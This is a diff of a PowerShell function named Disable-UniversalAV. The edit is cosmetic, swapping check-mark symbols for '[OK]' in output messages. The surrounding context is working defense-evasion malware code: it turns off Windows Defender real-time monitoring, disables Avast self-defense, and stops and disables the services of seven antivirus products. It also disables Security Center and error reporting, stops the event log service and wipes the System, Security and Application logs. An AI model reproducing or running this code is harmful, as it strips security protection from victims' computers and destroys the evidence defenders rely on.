@@ -31,7 +31,7 @@ function Disable-UniversalAV {
         if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
             $avName = $avProcesses[$proc]
             $installedAVs += $avName
-            Write-Host "  [✓] Detected: $avName" -ForegroundColor Green
+            Write-Host "  [OK] Detected: $avName" -ForegroundColor Green
         }
     }
     
@@ -63,7 +63,7 @@ function Disable-UniversalAV {
             Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
         }
         
-        Write-Host "  [✓] Windows Defender bypassed" -ForegroundColor Green
+        Write-Host "  [OK] Windows Defender bypassed" -ForegroundColor Green
     }
     
     # ========== AVAST ==========
@@ -87,7 +87,7 @@ function Disable-UniversalAV {
             Set-ItemProperty -Path $avastPath -Name "SelfDefense" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
         }
         
-        Write-Host "  [✓] Avast bypassed" -ForegroundColor Green
+        Write-Host "  [OK] Avast bypassed" -ForegroundColor Green
     }
     
     # ========== AVG ==========
@@ -105,7 +105,7 @@ function Disable-UniversalAV {
             Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
         }
         
-        Write-Host "  [✓] AVG bypassed" -ForegroundColor Green
+        Write-Host "  [OK] AVG bypassed" -ForegroundColor Green
     }
     
     # ========== MCAFEE ==========
@@ -123,7 +123,7 @@ function Disable-UniversalAV {
             Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
         }
         
-        Write-Host "  [✓] McAfee bypassed" -ForegroundColor Green
+        Write-Host "  [OK] McAfee bypassed" -ForegroundColor Green
     }
     
     # ========== NORTON ==========
@@ -141,7 +141,7 @@ function Disable-UniversalAV {
             Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
         }
         
-        Write-Host "  [✓] Norton bypassed" -ForegroundColor Green
+        Write-Host "  [OK] Norton bypassed" -ForegroundColor Green
     }
     
     # ========== KASPERSKY ==========
@@ -159,7 +159,7 @@ function Disable-UniversalAV {
             Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
         }
         
-        Write-Host "  [✓] Kaspersky bypassed" -ForegroundColor Green
+        Write-Host "  [OK] Kaspersky bypassed" -ForegroundColor Green
     }
     
     # ========== BITDEFENDER ==========
@@ -177,7 +177,7 @@ function Disable-UniversalAV {
             Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
         }
         
-        Write-Host "  [✓] Bitdefender bypassed" -ForegroundColor Green
+        Write-Host "  [OK] Bitdefender bypassed" -ForegroundColor Green
     }
     
     # ========== MALWAREBYTES ==========
@@ -193,7 +193,7 @@ function Disable-UniversalAV {
         Stop-Service -Name "MBAMService" -Force -ErrorAction SilentlyContinue
         Set-Service -Name "MBAMService" -StartupType Disabled -ErrorAction SilentlyContinue
         
-        Write-Host "  [✓] Malwarebytes bypassed" -ForegroundColor Green
+        Write-Host "  [OK] Malwarebytes bypassed" -ForegroundColor Green
     }
     
     # ========== UNIVERSAL BYPASS TECHNIQUES ==========
@@ -203,20 +203,20 @@ function Disable-UniversalAV {
     try {
         Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
         Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
-        Write-Host "  [✓] Security Center disabled" -ForegroundColor Green
+        Write-Host "  [OK] Security Center disabled" -ForegroundColor Green
     } catch {}
     
     # 2. Disable Windows Error Reporting (prevents crash reports)
     try {
         Stop-Service -Name "WerSvc" -Force -ErrorAction SilentlyContinue
         Set-Service -Name "WerSvc" -StartupType Disabled -ErrorAction SilentlyContinue
-        Write-Host "  [✓] Error Reporting disabled" -ForegroundColor Green
+        Write-Host "  [OK] Error Reporting disabled" -ForegroundColor Green
     } catch {}
     
     # 3. Disable Event Log (prevents logging)
     try {
         Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue
-        Write-Host "  [✓] Event logging stopped" -ForegroundColor Green
+        Write-Host "  [OK] Event logging stopped" -ForegroundColor Green
     } catch {}
     
     # 4. Clear event logs
@@ -224,11 +224,11 @@ function Disable-UniversalAV {
         wevtutil cl System 2>&1 | Out-Null
         wevtutil cl Security 2>&1 | Out-Null
         wevtutil cl Application 2>&1 | Out-Null
-        Write-Host "  [✓] Event logs cleared" -ForegroundColor Green
+        Write-Host "  [OK] Event logs cleared" -ForegroundColor Green
     } catch {}
     
-    Write-Host "`n[✓] Universal AV bypass complete!" -ForegroundColor Green
-    Write-Host "[✓] Detected and bypassed: $($installedAVs -join ', ')" -ForegroundColor Green
+    Write-Host "`n[OK] Universal AV bypass complete!" -ForegroundColor Green
+    Write-Host "[OK] Detected and bypassed: $($installedAVs -join ', ')" -ForegroundColor Green
     
     return $installedAVs
 }
